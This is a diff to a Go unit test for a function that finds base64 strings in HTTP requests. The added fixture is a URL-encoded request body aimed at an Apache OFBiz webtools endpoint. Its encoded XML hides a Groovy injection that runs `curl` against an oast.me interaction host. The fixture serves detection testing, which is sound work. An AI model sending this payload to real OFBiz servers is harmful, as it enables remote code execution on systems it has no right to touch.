@@ -134,6 +134,16 @@ func TestFindBase64Strings(t *testing.T) {
 			asciiOnly:     true,
 		},
 		{
+			description: "Double encoded body",
+			request: models.Request{
+				Raw:  "Content-Type: application/x-www-form-urlencoded",
+				Body: []byte("statsDecoratorLocation=http%3a//oast.fun/x%3fb64_body%3dPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2NyZWVucyB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiAgeG1sbnM9Imh0dHA6Ly9vZmJpei5hcGFjaGUub3JnL1dpZGdldC1TY3JlZW4iIHhzaTpzY2hlbWFMb2NhdGlvbj0iaHR0cDovL29mYml6LmFwYWNoZS5vcmcvV2lkZ2V0LVNjcmVlbiBodHRwOi8vb2ZiaXouYXBhY2hlLm9yZy9kdGRzL3dpZGdldC1zY3JlZW4ueHNkIj48c2NyZWVuIG5hbWU9IlN0YXRzRGVjb3JhdG9yIj48c2VjdGlvbj48YWN0aW9ucz48c2V0IHZhbHVlPSIke2dyb292eTonY3VybCBjdWZlbWZrMmJnajY1ODYzcmZsZ2RqZ2Jhbnl6N2pueWUub2FzdC5tZScuZXhlY3V0ZSgpO30iLz48L2FjdGlvbnM%252BPC9zZWN0aW9uPjwvc2NyZWVuPjwvc2NyZWVucz4%253D"),
+				Uri:  "XXXXXXXX/webtools/control/view/StatsSinceStart",
+			},
+			base64sToFind: []string{"PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2NyZWVucyB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiAgeG1sbnM9Imh0dHA6Ly9vZmJpei5hcGFjaGUub3JnL1dpZGdldC1TY3JlZW4iIHhzaTpzY2hlbWFMb2NhdGlvbj0iaHR0cDovL29mYml6LmFwYWNoZS5vcmcvV2lkZ2V0LVNjcmVlbiBodHRwOi8vb2ZiaXouYXBhY2hlLm9yZy9kdGRzL3dpZGdldC1zY3JlZW4ueHNkIj48c2NyZWVuIG5hbWU9IlN0YXRzRGVjb3JhdG9yIj48c2VjdGlvbj48YWN0aW9ucz48c2V0IHZhbHVlPSIke2dyb292eTonY3VybCBjdWZlbWZrMmJnajY1ODYzcmZsZ2RqZ2Jhbnl6N2pueWUub2FzdC5tZScuZXhlY3V0ZSgpO30iLz48L2FjdGlvbnM+PC9zZWN0aW9uPjwvc2NyZWVuPjwvc2NyZWVucz4="},
+			asciiOnly:     true,
+		},
+		{
 			description: "parses body as form",
 			request: models.Request{
 				Body: []byte("aaaa=YWE%3D&foo=cmd+YmI%3D"),
